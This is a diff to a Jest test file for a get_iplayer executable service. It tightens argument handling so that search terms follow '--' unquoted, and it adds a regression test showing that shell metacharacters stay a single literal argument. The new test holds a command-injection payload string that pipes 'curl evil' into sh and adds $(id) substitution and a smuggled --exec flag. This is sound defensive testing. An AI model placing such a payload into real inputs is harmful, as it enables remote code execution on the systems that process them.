@@ -139,11 +139,24 @@ describe('GetIplayerExecutableService', () => {
             const result = await service.getSearchParameters(mockTerm, mockSynonym);
 
             expect(result.exec).toBe(mockExec);
-            expect(result.args).toContain(`"${mockTerm}"`);
+            expect(result.args.slice(-2)).toEqual(['--', mockTerm]);
             expect(result.args).toContain('--exclude');
             mockSynonym.exemptions.split(',').forEach((exemption: string) => {
-                expect(result.args).toContain(`"${exemption}"`);
+                expect(result.args).toContain(exemption);
             });
+        });
+
+        it('passes shell metacharacters through as a single literal argument', async () => {
+            mockedConfigService.getParameter.mockImplementation((key: IplayarrParameter) =>
+                Promise.resolve(key === IplayarrParameter.GET_IPLAYER_EXEC ? 'get_iplayer --profile-dir "/a b"' : undefined)
+            );
+            const payload = '"; curl evil | sh; $(id) `id` --exec=x';
+
+            const result = await service.getSearchParameters(payload);
+
+            expect(result.args.slice(-2)).toEqual(['--', payload]);
+            expect(result.args).toContain('/a b');
+            expect(result.args.some((a: string) => a.includes('"/a b"'))).toBe(false);
         });
 
         it('should handle "*" as term and add available-since parameter', async () => {
